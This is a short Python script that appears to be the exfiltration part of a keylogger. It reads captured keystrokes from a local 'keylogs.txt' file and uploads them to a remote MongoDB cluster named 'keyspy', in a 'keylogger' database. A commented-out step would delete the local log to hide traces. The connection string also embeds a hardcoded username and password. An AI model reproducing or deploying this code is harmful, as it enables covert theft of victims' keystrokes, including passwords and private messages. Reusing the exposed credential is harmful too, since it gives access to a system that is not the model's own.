import pymongo
import os

# Connect to MongoDB
# client = pymongo.MongoClient("mongodb://localhost:27017/")
# db = client["mydatabase"]
# collection = db["mycollection"]
client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
db = client["keylogger"]
keylogs_collection = db["keylog"]
# payload_collection = db["payload"]

# Read the text file
file_path = "keylogs.txt"
with open(file_path, "r") as file:
    text_content = file.read()

# Create a document to store in MongoDB
document = {"text": text_content}

# Insert the document into the collection
keylogs_collection.insert_one(document)

# if os.path.exists("keylogs.txt"):
#     os.remove("keylogs.txt")

print("Text content stored in MongoDB successfully.")
